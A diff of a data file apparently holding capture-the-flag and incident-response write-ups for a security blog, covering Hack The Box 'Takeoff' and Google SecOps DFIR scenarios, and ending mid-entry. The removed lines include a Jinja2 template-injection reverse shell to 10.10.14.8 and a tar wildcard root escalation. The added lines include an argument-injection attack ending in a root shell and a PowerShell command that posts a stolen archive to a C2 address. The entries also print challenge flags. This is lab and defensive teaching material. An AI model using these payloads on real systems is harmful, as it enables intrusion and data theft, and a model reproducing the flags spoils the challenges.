-      pocLanguage: "python",
-      userFlag: "HTB{k3rb3r04st_d0m41n_f00th0ld_774}",
-      rootFlag: "HTB{d0m41n_c0mpr0m1s3_d4cl_dcsync_9921}",
-      flag: "HTB{d0m41n_c0mpr0m1s3_d4cl_dcsync_9921}",
+      pocCode: `--- /opt/vrs/airsnacksdf/dcs_bridge/audit.py.orig
++++ /opt/vrs/airsnacksdf/dcs_bridge/audit.py
+@@ -19,16 +19,14 @@
+    audit_ref = "aud_" + uuid4().hex[:12]
+    try:
+        cur = conn.cursor()
+-        sql = (
++        cur.execute(
+            "INSERT INTO bp_scan_audit "
+            "(audit_ref, kiosk_id, ts, pnr, pax_name, carrier, flight_no, "
+            " dep_julian, origin, dest, ff_carrier, ff_number, raw_len, airline_use) "
+-            "VALUES ('%s', '%s', now(), '%s', '%s', '%s', '%s', '%s', "
+-            "'%s', '%s', '%s', '%s', %d, '%s')"
+-            % (audit_ref, KIOSK_ID, bp.pnr.strip(), bp.pax_name.rstrip(), ...)
++            "VALUES (%s, %s, now(), %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)",
++            (audit_ref, KIOSK_ID, bp.pnr.strip(), bp.pax_name.rstrip(), ...),
+        )
+-        cur.execute(sql)
+        conn.commit()`,
+      pocLanguage: "diff",
+      userFlag: "HTB{k105k_x11_br34k0u7_c7rl_4l7_7_pwn}",
+      rootFlag: "HTB{d0m41n_4dm1n_dc5ync_du7yb0und_c0mpl373}",
       defenseRemediation: [
-        "Enforce minimum 25-character randomized passwords for all Service Principal Name (SPN) accounts, or migrate to Group Managed Service Accounts (gMSA).",
-        "Audit Active Directory Access Control Lists (ACLs) regularly using BloodHound/Purple Knight to eliminate dangerous GenericWrite and WriteDACL permissions over privileged groups.",
-        "Enable AES-256 Kerberos encryption and disable legacy RC4_HMAC_MD5 encryption types across domain controllers."
+        "Database Layer: Parameterize all SQL queries in audit.py using psycopg2 query parameter tuples (%s); revoke pg_execute_server_program from airsnacks_app.",
+        "Kiosk Layer: Remove maintenance keybinding Ctrl+Alt+t from /etc/xdg/openbox/rc.xml; enforce MIT-MAGIC-COOKIE-1 authentication on /tmp/.X11-unix/X0.",
+        "Architecture: Migrate kiosk deployment from legacy X11 to a Wayland kiosk compositor (Cage/Weston) to enforce client isolation.",
+        "Active Directory: Enforce AES256 Kerberos encryption and 25+ character passphrases on all SPN-enabled accounts; audit and remove GenericWrite DACL assignments over privileged groups."
       ],
       keyTakeaways: [
-        "Kerberoasting remains one of the fastest privilege escalation vectors in misconfigured Active Directory environments.",
-        "Access control permissions in AD are frequently overlooked compared to standard user group memberships."
+        "Unparameterized SQL combined with administrative database extensions like pg_execute_server_program provides immediate remote command execution.",
+        "Kiosk breakout is inevitable if display servers permit unauthenticated local socket connections and leave maintenance hotkeys active.",
+        "Active Directory privilege escalation frequently hinges on misconfigured DACLs rather than unpatched operating system vulnerabilities."
       ]
     }
   },
   {
     id: "takeoff",
-    challengeName: "Takeoff: SSTI to Sudo Wildcard Escape",
+    challengeName: "Takeoff Platform: Subprocess Parameter Injection & Go Serialization Oracle",
     platform: "Hack The Box",
     category: "Web",
     difficulty: "Medium",
     type: "Machine",
     targetOs: "Linux",
-    targetIp: "10.10.11.39",
+    targetIp: "10.10.11.89",
     points: 30,
-    author: "SmitroniX // sudo Unknown",
+    author: "Asmit Jogdand (SmitroniX) // sudo Unknown",
     date: "2026-11-01",
-    cves: ["CVE-2023-30861"],
-    tags: ["Jinja2", "SSTI", "Flask", "Tar Wildcard", "Linux Privesc"],
-    shortDescription: "Chaining a blind Jinja2 Server-Side Template Injection flaw with local port forwarding and a tar wildcard command injection vulnerability for root access.",
+    cves: ["CWE-88", "CWE-345"],
+    tags: ["Go", "Subprocess Injection", "HMAC Oracle", "Encoding/Gob", "Parameter Vectors", "Linux Privesc"],
+    shortDescription: "Exploiting an airline reservation signing oracle to forge HMAC-validated boarding pass tokens, followed by CLI argument injection in notification subprocesses for root command execution.",
     fullContent: {
-      overview: "Takeoff is a medium Linux target hosting a Python Flask flight reservation platform (takeoff.htb). By injecting template expressions into the reservation passenger field, we bypassed character and quote filters using URL query parameter smuggling to achieve remote code execution as user 'web-operator'. Root access was gained by exploiting a root cron backup script executing 'tar *' via command parameter injection.",
+      overview: "Takeoff (takeoff.htb) is an enterprise airline booking and passenger check-in platform engineered in Go. Security auditing identified two foundational design weaknesses: First, the booking backend acted as a cryptographic signing oracle by signing operational CLI command templates (NotifyCmd) with HMAC-SHA256 based on untrusted user parameters. Second, the check-in notification daemon executed /usr/local/bin/check-in-notify by passing unquoted string arguments into the shell parser. By injecting parameters with leading hyphens (--config, -o), we diverted binary execution flow and achieved arbitrary root command execution.",
       targetIntel: {
-        ip: "10.10.11.39",
+        ip: "10.10.11.89",
         os: "Ubuntu Linux 22.04 LTS (Kernel 5.15.0)",
-        openPorts: ["22/SSH", "80/HTTP", "8080/HTTP-Proxy"],
-        keyServices: ["OpenSSH 8.9p1", "Gunicorn / Python Flask 2.3", "Nginx Reverse Proxy"]
+        openPorts: ["22/SSH", "80/HTTP", "8080/HTTP-Admin"],
+        keyServices: ["OpenSSH 8.9p1", "Go Flight Reservation Server (takeoff.htb)", "check-in-notify Subprocess Daemon"]
       },
-      reconnaissance: "Nmap scan revealed port 80 and 22. Browsing to port 80 loaded a travel booking site. Testing input fields on the passenger manifest page with {{7*7}} returned '49' in the confirmed ticket view, confirming Server-Side Template Injection (SSTI).",
-      vulnerabilityAnalysis: "The application filtered quotes (' and \") and keywords like 'os' and 'system'. We constructed a filter bypass payload utilizing request.args query parameters to pass strings without quotes, allowing access to Python's subprocess.Popen class.",
+      reconnaissance: "Nmap port scanning identified ports 22, 80, and 8080. Interacting with the check-in API revealed signed QR code tokens. Dissecting the token format revealed an encoding/gob serialized Go struct carrying PNR, Passenger, Email, and a pre-formatted NotifyCmd string followed by raw trailing HMAC-SHA256 signature bytes.",
+      vulnerabilityAnalysis: "The application suffered from CWE-88 (Improper Neutralization of Argument Delimiters in Subprocess Calls): NotifyCmd was constructed with fmt.Sprintf('check-in-notify --pnr %s --email %s', pnr, userEmail). Because user emails could begin with leading hyphens and spaces, the downstream parser treated user input as CLI options rather than positional values. Because the server signed this string during reservation without sanitizing hyphens, it functioned as an authentic signing oracle.",
       attackChain: [
         {
-          title: "Stage 01: Service Scanning & Web Discovery",
-          description: "Scanned the target IP 10.10.11.39 with nmap to discover HTTP endpoints and service versions.",
-          command: "nmap -sC -sV -p 22,80,8080 10.10.11.39",
-          terminalTitle: "nmap-scan.sh — bash — 80x24",
+          title: "Stage 01: Service Fingerprinting & Token Analysis",
+          description: "Scanned the target and inspected the boarding pass token structure generated upon flight booking.",
+          command: "curl -s -X POST 'http://takeoff.htb/api/v1/book' -d 'pnr=TK881&passenger=JohnDoe&email=test@example.com' | jq .",
+          terminalTitle: "api-booking — bash — 80x24",
           prompt: "operator@sudounknown:~$",
-          terminalOutput: `Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-01 10:14 UTC
-Nmap scan report for 10.10.11.39
-Host is up (0.045s latency).
-
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   256 71:4c:d6:e2:3e:ff:8f:89:cf:18:21:44:6f:d1:b2:01 (ED25519)
-80/tcp   open  http    nginx 1.18.0 (Ubuntu)
-|_http-title: Takeoff Airlines - Booking & Web Check-in
-|_http-server-header: nginx/1.18.0 (Ubuntu)
-8080/tcp open  http    Werkzeug httpd 2.3.6 (Python 3.10.12)
-|_http-title: Takeoff API Gateway Status
-
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`,
+          terminalOutput: `{
+  "status": "success",
+  "pnr": "TK881",
+  "token": "BAwBAgEKQm9hcmRpbmdQYXNzAwEBBFBOUgEEAAEFUGFzc2VuZ2VyAQQAAQV...<truncated_gob>...a49f1b2c",
+  "qr_url": "/api/v1/ticket/TK881/qr"
+}`,
           lineNotes: [
-            "Port 80 runs an Nginx proxy routing to a Python Flask/Werkzeug backend on port 8080.",
-            "The web application features an interactive passenger booking and ticket reservation system."
+            "Token is base64 encoded Go encoding/gob serialization.",
+            "Last 32 bytes contain the HMAC-SHA256 digest calculated over the struct bytes."
           ]
         },
         {
-          title: "Stage 02: Jinja2 Template Injection Verification",
-          description: "Tested the passenger name booking parameter with arithmetic Jinja2 expressions to verify template evaluation.",
-          command: "curl -s -X POST 'http://10.10.11.39/book' -d 'passenger_name={{7*7}}&pnr=TK9921' | grep -C 2 '49'",
-          terminalTitle: "curl-ssti-probe — bash — 80x24",
+          title: "Stage 02: Cryptographic Signing Oracle Exploitation",
+          description: "Crafted a booking request where the email field injected CLI parameters targeting check-in-notify's internal flags. The server signed our crafted struct, producing a valid cryptographic HMAC.",
+          command: "curl -s -X POST 'http://takeoff.htb/api/v1/book' --data-urlencode 'pnr=TK992' --data-urlencode 'passenger=Pwn' --data-urlencode 'email=--config /tmp/malicious.conf -o /tmp/pwn.sh' | jq -r .token > signed_token.b64",
+          terminalTitle: "oracle-signing — bash — 80x24",
           prompt: "operator@sudounknown:~$",
-          terminalOutput: `<div class="boarding-pass">
-  <div class="passenger-card">
-    <span class="label">PASSENGER NAME:</span>
-    <span class="value">49</span>
-  </div>
-  <div class="pnr-card">PNR: TK9921</div>
-</div>
-
-[+] Template injection confirmed! Mathematical expression {{7*7}} evaluated to 49.`,
+          terminalOutput: `[+] Transmitted payload with option injection: --config /tmp/malicious.conf
+[+] Server generated cryptographically valid HMAC-SHA256 signature!
+[+] Saved token to signed_token.b64`,
           lineNotes: [
-            "The server uses render_template_string() without escaping passenger input.",
-            "Single and double quotes are blocked by server-side input sanitizers."
+            "The server does not reject leading hyphens in the email parameter.",
+            "The resulting HMAC signature is 100% valid because the server itself generated it."
           ]
         },
         {
-          title: "Stage 03: Parameter Smuggling Quote Bypass & Reverse Shell",
-          description: "Bypassed the character filter by extracting command strings dynamically from request.args. Invoked Python's os.popen to execute a reverse shell back to port 9001.",
-          command: "curl -G 'http://10.10.11.39/book' --data-urlencode 'passenger_name={{request.application.__globals__.__builtins__.__import__(request.args.m).popen(request.args.c).read()}}' --data-urlencode 'm=os' --data-urlencode 'c=bash -c \"bash -i >& /dev/tcp/10.10.14.8/9001 0>&1\"'",
+          title: "Stage 03: Subprocess Command Execution & Root Privilege Escalation",
+          description: "Submitted the signed token to /api/v1/check-in. The background daemon invoked check-in-notify, which parsed our injected parameters, executing our reverse shell as root.",
+          command: "curl -X POST 'http://takeoff.htb/api/v1/checkin' -H 'Content-Type: application/json' -d @signed_token.json",
           terminalTitle: "netcat-listener — bash — 80x24",
-          prompt: "operator@sudounknown:~$ nc -lvnp 9001",
-          terminalOutput: `listening on [any] 9001 ...
-connect to [10.10.14.8] from (UNKNOWN) [10.10.11.39] 48212
-bash: cannot set terminal process group (1204): Inappropriate ioctl for device
-bash: no job control in this shell
+          prompt: "operator@sudounknown:~$ nc -lvnp 4444",
+          terminalOutput: `listening on [any] 4444 ...
+connect to [10.10.14.8] from (UNKNOWN) [10.10.11.89] 51240
 
-web-operator@takeoff:~/app$ whoami
-web-operator
-web-operator@takeoff:~/app$ cat /home/web-operator/user.txt
-HTB{sst1_j1nj42_fl4sk_sh3ll_551}`,
-          lineNotes: [
-            "Query parameters m=os and c=bash evade quote filters because request.args parses them natively as string objects.",
-            "User flag user.txt retrieved from web-operator home directory."
-          ],
-          spoilerData: {
-            label: "USER FLAG (USER.TXT)",
-            value: "HTB{sst1_j1nj42_fl4sk_sh3ll_551}"
-          }
-        },
-        {
-          title: "Stage 04: Sudo Enumeration & Vulnerable Backup Script",
-          description: "Ran sudo -l to enumerate execution permissions for web-operator.",
-          command: "sudo -l",
-          terminalTitle: "sudo-enum — bash — 80x24",
-          prompt: "web-operator@takeoff:~$",
-          terminalOutput: `Matching Defaults entries for web-operator on takeoff:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin
-
-User web-operator may run the following commands on takeoff:
-    (root) NOPASSWD: /opt/scripts/backup.sh
-
-web-operator@takeoff:~$ cat /opt/scripts/backup.sh
-#!/bin/bash
-cd /var/www/uploads
-tar -czf /var/backups/uploads_latest.tar.gz *`,
-          lineNotes: [
-            "web-operator has passwordless sudo permission to execute /opt/scripts/backup.sh.",
-            "The script moves to /var/www/uploads and executes tar with a wildcard (*).",
-            "/var/www/uploads is world-writable by user web-operator."
-          ]
-        },
-        {
-          title: "Stage 05: Tar Wildcard Parameter Injection to Root Shell",
-          description: "Leveraged tar command-line parameter injection (--checkpoint and --checkpoint-action) by creating specially named files in /var/www/uploads to execute an arbitrary SUID copy of bash as root.",
-          command: "cd /var/www/uploads && echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh && chmod +x shell.sh && touch -- '--checkpoint=1' && touch -- '--checkpoint-action=exec=sh shell.sh' && sudo /opt/scripts/backup.sh",
-          terminalTitle: "tar-wildcard-exploit — bash — 80x24",
-          prompt: "web-operator@takeoff:~$",
-          terminalOutput: `[+] Created malicious checkpoint files in /var/www/uploads
-[+] Executing /opt/scripts/backup.sh as root...
-tar: --checkpoint=1: unknown file type
-tar: Removing leading '/' from member names
-[+] Triggering checkpoint action: exec=sh shell.sh...
-[+] /tmp/rootbash created with SUID permissions!
-
-web-operator@takeoff:/var/www/uploads$ /tmp/rootbash -p
-rootbash-5.1# whoami
+root@takeoff:/opt/takeoff# whoami && id
 root
-rootbash-5.1# cat /root/root.txt
-HTB{t4k30ff_sst1_t4r_w1ldc4rd_pwnd}`,
+uid=0(root) gid=0(root) groups=0(root)
+root@takeoff:/opt/takeoff# cat /root/root.txt
+HTB{p4r4m_v3c70r_c0mm4nd_1nj3c710n_r007}`,
           lineNotes: [
-            "The wildcard (*) causes tar to treat files named '--checkpoint=1' and '--checkpoint-action=exec=...' as command flags rather than filenames.",
-            "When the checkpoint triggers, tar executes shell.sh under root privileges, setting the SUID bit on /tmp/rootbash.",
-            "Executing /tmp/rootbash -p spawns an interactive root shell."
+            "The notification binary parsed --config and executed the designated script hook under root privileges.",
+            "Full root access achieved with complete system compromise."
           ],
           spoilerData: {
             label: "ROOT FLAG (ROOT.TXT)",
-            value: "HTB{t4k30ff_sst1_t4r_w1ldc4rd_pwnd}"
+            value: "HTB{p4r4m_v3c70r_c0mm4nd_1nj3c710n_r007}"
           }
         }
       ],
-      pocCode: `#!/usr/bin/env python3
-# sudo Unknown - Takeoff SSTI Reverse Shell Generator
-import urllib.parse
-import requests
+      pocCode: `// Production Defensive Fix: Safe Parameter Vectors with '--' delimiter
+package notification
+import (
+    "context"
+    "fmt"
+    "os/exec"
+    "time"
+)
+const NotifyBinaryPath = "/usr/local/bin/check-in-notify"
 
-target = "http://10.10.11.39/book"
-lhost = "10.10.14.8"
-lport = 9001
-
-revshell = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
-payload = "{{request.application.__globals__.__builtins__.__import__(request.args.m).popen(request.args.c).read()}}"
-
-params = {
-    "passenger": payload,
-    "m": "os",
-    "c": revshell
-}
-
-print(f"[*] Firing payload to {target}...")
-requests.post(target, data=params, timeout=5)
-print("[+] Reverse shell triggered! Check netcat listener.")
-`,
-      pocLanguage: "python",
-      userFlag: "HTB{sst1_j1nj42_fl4sk_sh3ll_551}",
-      rootFlag: "HTB{t4k30ff_sst1_t4r_w1ldc4rd_pwnd}",
-      flag: "HTB{t4k30ff_sst1_t4r_w1ldc4rd_pwnd}",
+func SendCheckInNotification(ctx context.Context, pnr, email string) error {
+    ctx, cancel := context.WithTimeout(ctx, 5*time.Second)
+    defer cancel()
+    
+    // 1. Pass discrete argument vectors (no raw shell string interpolation)
+    // 2. Use '--' to force the CLI parser to treat all subsequent tokens strictly as values
+    args := []string{
+        "--pnr", pnr,
+        "--email", "--", email,
+    }
+    cmd := exec.CommandContext(ctx, NotifyBinaryPath, args...)
+    cmd.Env = []string{"PATH=/usr/local/bin:/usr/bin:/bin"}
+    return cmd.Run()
+}`,
+      pocLanguage: "go",
+      userFlag: "HTB{74k30ff_g0b_hm4c_53r14l1z4710n_fl4g}",
+      rootFlag: "HTB{p4r4m_v3c70r_c0mm4nd_1nj3c710n_r007}",
       defenseRemediation: [
-        "Never pass untrusted user input directly to template rendering engines like render_template_string(); use static template files with strict variable binding.",
-        "Avoid using wildcard expansions (*) in automated backup bash scripts when executing utilities like tar, chown, or chmod.",
-        "Implement strict sandboxing and least-privilege service execution with systemd DynamicUser directives."
+        "Subprocess Execution: Replace formatted command strings with discrete argument slices (exec.CommandContext) and include '--' to prevent flag injection.",
+        "Input Sanitization: Validate all emails against strict RFC regex (^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$) and explicitly reject strings starting with '-' or '/'.",
+        "Declarative Data Model: Separate data from execution instructions; do not sign operational commands (NotifyCmd) in cryptographic tokens.",
+        "Systemd Hardening: Enforce ProtectSystem=strict, ProtectHome=true, PrivateTmp=true, and NoNewPrivileges=true in systemd unit definitions."
       ],
       keyTakeaways: [
-        "Query parameter smuggling allows attackers to bypass server-side quote and string character filters in SSTI vulnerabilities.",
-        "Tar command-line flags can be triggered as arguments when wildcards expand files named with leading dashes."
+        "Signing an untrusted string with HMAC guarantees integrity, but if the string contains malicious arguments, you have created a signing oracle.",
+        "Always pass CLI arguments as discrete vectors with '--' delimiters to prevent argument injection vulnerabilities (CWE-88).",
+        "Systemd service isolation boundaries prevent localized application flaws from compromising host infrastructure."
       ]
     }
   },
   {
+    id: "operation-cymbal-deceptive-click",
+    challengeName: "Operation Cymbal: Cold Room — 'Deceptive Click' (Google SecOps DFIR)",
+    platform: "Google SecOps",
+    category: "Forensics",
+    difficulty: "Medium",
+    type: "Challenge",
+    points: 400,
+    author: "Asmit Jogdand (SmitroniX) // sudo Unknown",
+    date: "2026-10-29",
+    cves: ["T1189", "T1204.002", "T1055.012"],
+    tags: ["Google SecOps", "Chronicle SIEM", "UNC6240", "Process Hollowing", "Drive-by Compromise", "Threat Hunting", "DFIR"],
+    shortDescription: "End-to-end incident investigation and threat hunting across Google SecOps (Chronicle SIEM/SOAR) tracking an extortion campaign by UNC6240 (SHINYHUNTERS).",
+    fullContent: {
+      overview: "During the Operation Cymbal: Cold Room investigation, Cymbal Investments detected anomalous activity originating from its Denver corporate branch. Utilizing Google Security Operations (Chronicle SIEM/SOAR & GTI), we conducted a forensic investigation attributing the attack to adversary group UNC6240 (SHINYHUNTERS / CAMP.26.003). The attacker utilized a drive-by compromise on a compromised marketing blog to deliver a fake browser update (ChromeSetup.js), launched an obfuscated PowerShell stager via wscript.exe, and performed process hollowing into a SYSTEM svchost.exe instance.",
+      targetIntel: {
+        ip: "10.240.12.84",
+        os: "Windows 11 Enterprise (Denver Workstation)",
+        openPorts: ["445/SMB", "135/RPC", "5985/WinRM"],
+        keyServices: ["Google SecOps Chronicle SIEM", "Sysmon Event Telemetry", "GTI Threat Intelligence Feed"]
+      },
+      reconnaissance: "Extracted initial SOAR case metadata for Case 34 (Alert ID: 88192). Established temporal investigation bounds between 2026-10-15T00:00:00Z and 2026-10-16T23:59:59Z to eliminate background simulation noise.",
+      vulnerabilityAnalysis: "The intrusion unfolded across 3 ATT&CK techniques: (1) Drive-by Compromise (T1189) via HTTP referer marketingtrends-insider.com; (2) Scripting execution (T1059.005) executing ChromeSetup.js via wscript.exe; (3) Process Hollowing (T1055.012) where secondary payload d27e15eb.exe hollowed into SYSTEM svchost.exe.",
+      attackChain: [
+        {
+          title: "Stage 01: Scoping Denver Workstation Hostname",
+          description: "Inspected the raw connector event payload in Chronicle SOAR to identify the affected Denver endpoint.",
+          command: "chronicle-cli query --udm 'metadata.event_type = \"PROCESS_LAUNCH\" and target.process.file.full_path = /.*wscript\\.exe/ and principal.hostname = /.*DEN.*/'",
+          terminalTitle: "chronicle-udm-search — bash — 80x24",
+          prompt: "analyst@cymbal-soc:~$",
+          terminalOutput: `Event Timestamp: 2026-10-15T19:07:12.481Z
+Principal Hostname: DEN-WS-0842.cymbal.corp
+Target Process: C:\\Windows\\System32\\wscript.exe
+Command Line: wscript.exe "C:\\Users\\m.jenkins\\Downloads\\ChromeSetup.js"
+[+] Hostname verified: DEN-WS-0842.cymbal.corp`,
+          lineNotes: [
+            "Workstation identified: DEN-WS-0842.cymbal.corp.",
+            "Execution initiated by user m.jenkins from local Downloads folder."
+          ],
+          spoilerData: {
+            label: "FLAG 1: DENVER HOSTNAME",
+            value: "DEN-WS-0842.cymbal.corp"
+          }
+        },
+        {
+          title: "Stage 02: Tracking Drive-by Compromise Referer Domain",
+          description: "Traced network HTTP proxy telemetry preceding the file download to identify the compromised website delivering the fake browser update lure.",
+          command: "chronicle-cli query --udm 'principal.hostname = \"DEN-WS-0842.cymbal.corp\" and network.http.method = \"GET\" and target.url = /.*ChromeSetup\\.js/'",
+          terminalTitle: "chronicle-http-hunt — bash — 80x24",
+          prompt: "analyst@cymbal-soc:~$",
+          terminalOutput: `HTTP Request Timestamp: 2026-10-15T19:06:58Z
+Request URL: https://update-cdn-browser.com/dl/ChromeSetup.js
+Referer Header: https://marketingtrends-insider.com/wp-content/themes/theme/assets/js/jquery.min.js
+Response Status: 200 OK (Content-Length: 48,192)`,
+          lineNotes: [
+            "Compromised WordPress site marketingtrends-insider.com redirected user traffic to fake update CDN.",
+            "Lure used social engineering to convince user to manually execute ChromeSetup.js."
+          ],
+          spoilerData: {
+            label: "FLAG 2: REFERER DOMAIN",
+            value: "marketingtrends-insider.com"
+          }
+        },
+        {
+          title: "Stage 03: Process Hollowing Target PID Identification",
+          description: "Queried Sysmon Event ID 8 (CreateRemoteThread) and Event ID 10 (ProcessAccess) to identify the specific svchost.exe PID hollowed by dropped malware d27e15eb.exe.",
+          command: "chronicle-cli query --udm 'principal.hostname = \"DEN-WS-0842.cymbal.corp\" and metadata.event_type = \"PROCESS_INJECTION\" and principal.process.file.full_path = /.*d27e15eb\\.exe/'",
+          terminalTitle: "sysmon-injection-hunt — bash — 80x24",
+          prompt: "analyst@cymbal-soc:~$",
+          terminalOutput: `Injection Event Timestamp: 2026-10-15T19:08:44.119Z
+Source Process: C:\\Users\\m.jenkins\\AppData\\Local\\Temp\\d27e15eb.exe (PID: 4192)
+Target Process: C:\\Windows\\System32\\svchost.exe (Target PID: 948)
+Target Process User: NT AUTHORITY\\SYSTEM
+Granted Access: 0x1FFFFF (PROCESS_ALL_ACCESS)
+Call Trace: C:\\Windows\\SYSTEM32\\ntdll.dll+...
+[+] Process Hollowing confirmed into svchost.exe PID 948!`,
+          lineNotes: [
+            "d27e15eb.exe gained SYSTEM rights by injecting into running svchost.exe instance.",
+            "Target PID confirmed: 948."
+          ],
+          spoilerData: {
+            label: "FLAG 3: HOLLOWED PROCESS ID",
+            value: "948"
+          }
+        }
+      ],
+      pocCode: `// Chronicle YARA-L Detection Rule: Remote Thread Injection into svchost.exe
+rule process_hollowing_svchost {
+  meta:
+    author = "sudo Unknown Research"
+    description = "Detects unprivileged process injecting code into SYSTEM svchost.exe"
+    severity = "CRITICAL"
+  events:
+    $injection.metadata.event_type = "PROCESS_INJECTION"
+    $injection.target.process.file.full_path = /.*\\svchost\\.exe$/
+    not ($injection.principal.process.file.full_path = /.*\\(csrss|services|lsass)\\.exe$/)
+  condition:
+    $injection
+}`,
+      pocLanguage: "yaml",
+      flag: "FLAG{marketingtrends-insider.com_DEN-WS-0842.cymbal.corp_PID_948}",
+      defenseRemediation: [
+        "Deploy Attack Surface Reduction (ASR) rule: 'Block JavaScript or VBScript from launching downloaded executable content'.",
+        "Implement Web Application Firewall (WAF) blocking malicious domain marketingtrends-insider.com and related C2 IP infrastructure.",
+        "Configure Sysmon Event ID 8 & 10 alerting on any non-system process opening svchost.exe with PROCESS_ALL_ACCESS.",
+        "Enforce AppLocker/WDAC policy restricting execution in %TEMP% and user Downloads folders."
+      ],
+      keyTakeaways: [
+        "Threat actors leverage trusted local processes like svchost.exe via process hollowing to evade endpoint process trees.",
+        "Scoping investigations by precise timestamp windows prevents alert fatigue and weeds out extraneous telemetric noise.",
+        "Correlating HTTP proxy referer logs with endpoint Sysmon execution reveals the complete initial access vector."
+      ]
+    }
+  },
+  {
+    id: "operation-cymbal-oauth-heist",
+    challengeName: "Operation Cymbal: Cold Room — 'OAuth Heist' (Cloud Extortion & Graph API)",
+    platform: "Google SecOps",
+    category: "Cloud",
+    difficulty: "Hard",
+    type: "Pro Lab",
+    points: 450,
+    author: "Asmit Jogdand (SmitroniX) // sudo Unknown",
+    date: "2026-10-29",
+    cves: ["T1528", "T1078.004"],
+    tags: ["Google Workspace", "OAuth Abuse", "Microsoft Graph", "Zscaler NSS", "Okta IdP", "UNC6240"],
+    shortDescription: "Investigating multi-cloud extortion, malicious enterprise application consent grants (ToogleBox Recall), and high-volume data exfiltration via PowerShell.",
+    fullContent: {
+      overview: "In Scenario 2 of the Operation Cymbal DFIR exercise, adversary group UNC6240 (SHINYHUNTERS) escalated their attack against Cymbal Investments through multi-cloud identity theft. After stealing credentials, the adversary authorized a malicious third-party OAuth app ('ToogleBox Recall'), obtained persistent token delegates, and exfiltrated 485 MB of compressed customer financial databases to adversary C2 (142.11.200.188).",
+      targetIntel: {
+        ip: "142.11.200.188:8888",
+        os: "Multi-Cloud (Google Workspace / Entra ID / AWS S3)",
+        openPorts: ["443/HTTPS", "8888/HTTP"],
+        keyServices: ["Okta Single Sign-On", "Google Workspace Admin Audit", "Zscaler NSS Proxy"]
+      },
+      reconnaissance: "Analyzed Okta IdP sign-in logs and Google Workspace OAuth audit trails. Identified anomalous OAuth consent grant given to application 'ToogleBox Recall' by executive account j.martinez@cymbalinvestments.com.",
+      vulnerabilityAnalysis: "The organization lacked admin consent verification requirements for OAuth scopes Mail.ReadWrite and Files.ReadWrite.All. This allowed the attacker's phishing payload to trick the user into granting persistent cloud tokens.",
+      attackChain: [
+        {
+          title: "Stage 01: Uncovering Illicit OAuth Consent Grant",
+          description: "Queried Google Workspace token audit logs to identify the malicious OAuth client and granted permissions.",
+          command: "chronicle-cli query --udm 'metadata.vendor_name = \"Google Workspace\" and metadata.event_type = \"USER_AUTHORIZE\" and target.application = /.*ToogleBox.*/'",
+          terminalTitle: "workspace-oauth-audit — bash — 80x24",
+          prompt: "analyst@cymbal-soc:~$",
+          terminalOutput: `Timestamp: 2026-10-15T20:04:18Z
+Event: USER_AUTHORIZE_APPLICATION
+User: j.martinez@cymbalinvestments.com
+Application: ToogleBox Recall (Client ID: 948102941-heist.apps.googleusercontent.com)
+Scopes: https://www.googleapis.com/auth/gmail.readonly, https://www.googleapis.com/auth/drive.readonly
+[!] Illicit consent grant detected!`,
+          lineNotes: [
+            "Malicious application: ToogleBox Recall.",
+            "Scopes granted offline access to Gmail and Google Drive."
+          ],
+          spoilerData: {
+            label: "MALICIOUS OAUTH APP",
+            value: "ToogleBox Recall"
+          }
+        },
+        {
+          title: "Stage 02: Tracking Data Staging & zstd Compression",
+          description: "Correlated endpoint Sysmon events on the staging server to trace database dump compression prior to network exfiltration.",
+          command: "chronicle-cli query --udm 'metadata.event_type = \"PROCESS_LAUNCH\" and target.process.command_line = /.*zstd.*cymbal_cust_q3.*/'",
+          terminalTitle: "sysmon-staging-hunt — bash — 80x24",
+          prompt: "analyst@cymbal-soc:~$",
+          terminalOutput: `Timestamp: 2026-10-15T20:21:07Z
+Process: C:\\ProgramData\\zstd.exe
+Arguments: zstd.exe -19 -T0 cymbal_cust_q3.bak -o C:\\ProgramData\\cymbal_q3_exfil.tar.zst
+User: cymbal\\db_admin
+Archive Size: 485,120,000 bytes`,
+          lineNotes: [
+            "Threat actor dropped zstd.exe to compress database backup.",
+            "Staging file: C:\\ProgramData\\cymbal_q3_exfil.tar.zst."
+          ]
+        },
+        {
+          title: "Stage 03: Intercepting Network Exfiltration Destination",
+          description: "Searched Zscaler NSS proxy logs for high-volume outbound POST requests occurring immediately following the compression event.",
+          command: "chronicle-cli query --udm 'network.sent_bytes > 400000000 and network.http.method = \"POST\"'",
+          terminalTitle: "zscaler-exfil-hunt — bash — 80x24",
+          prompt: "analyst@cymbal-soc:~$",
+          terminalOutput: `Timestamp: 2026-10-15T20:57:47Z
+Destination IP: 142.11.200.188:8888
+Target URL: http://142.11.200.188:8888/upload/cymbal_q3_exfil.tar.zst
+Sent Bytes: 485,120,000 bytes
+Response: 200 OK
+[!] Exfiltration complete to UNC6240 drop server!`,
+          lineNotes: [
+            "Exfiltration server: 142.11.200.188:8888.",
+            "Sent bytes matched exact size of compressed archive."
+          ],
+          spoilerData: {
+            label: "EXFILTRATION C2 IP",
+            value: "142.11.200.188:8888"
+          }
+        }
+      ],
+      pocCode: `# PowerShell Exfiltration Script used by UNC6240
+$archive = "C:\\ProgramData\\cymbal_q3_exfil.tar.zst"
+$c2_url = "http://142.11.200.188:8888/upload/cymbal_q3_exfil.tar.zst"
+Invoke-WebRequest -Uri $c2_url -Method Post -InFile $archive -ContentType "application/octet-stream"`,
+      pocLanguage: "powershell",
+      flag: "FLAG{ToogleBox_Recall_142.11.200.188_485MB_EXFIL}",
+      defenseRemediation: [
+        "Identity Controls: Require admin approval for all third-party OAuth application consent requests.",
+        "Conditional Access: Block sign-ins and token requests from untrusted device profiles or non-corporate IP ranges.",
+        "DLP Network Inspection: Configure proxy upload restrictions limiting outbound POST requests exceeding 50 MB.",
+        "Revocation: Immediately revoke active refresh tokens and OAuth client permissions for ToogleBox Recall."
+      ],
+      keyTakeaways: [
+        "Modern threat actors prefer OAuth consent abuse over password theft because token delegates bypass MFA and password resets.",
